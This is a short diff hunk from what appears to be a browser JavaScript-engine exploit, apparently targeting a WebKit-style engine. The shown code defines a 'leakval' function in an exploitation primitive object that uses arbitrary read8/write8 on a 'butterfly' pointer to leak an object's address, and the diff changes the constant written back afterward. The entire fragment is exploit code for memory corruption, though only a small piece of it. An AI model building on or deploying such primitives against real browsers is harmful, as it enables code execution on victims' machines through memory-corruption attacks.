@@ -313,7 +313,7 @@ var prim = {
   leakval: function(jsval) {
       leakval_helper[0] = jsval;
       var rtv = this.read8(butterfly);
-      this.write8(butterfly, new int64(0x41414142, 0xffffffff));
+      this.write8(butterfly, new int64(0x41414141, 0xffffffff));
 
       return rtv;
   },
